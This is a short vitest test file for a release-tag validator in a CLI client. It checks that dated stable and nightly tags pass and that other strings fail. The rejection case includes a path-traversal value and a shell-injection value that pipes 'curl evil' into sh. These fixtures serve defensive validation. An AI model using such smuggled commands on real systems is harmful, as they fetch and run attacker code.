import { describe, expect, it } from "vitest"

import { isReleaseTag } from "./cliClient"

describe("isReleaseTag", () => {
  it("accepts stable and nightly pp release tags", () => {
    expect(isReleaseTag("v2026.10.29")).toBe(true)
    expect(isReleaseTag("v2026.10.29.2")).toBe(true)
    expect(isReleaseTag("v2026.10.29-nightly.12")).toBe(true)
  })

  it("rejects anything else", () => {
    expect(isReleaseTag("latest")).toBe(false)
    expect(isReleaseTag("v2026.10.29/../../evil")).toBe(false)
    expect(isReleaseTag("v2026.10.29'; curl evil | sh; '")).toBe(false)
    expect(isReleaseTag("")).toBe(false)
  })
})
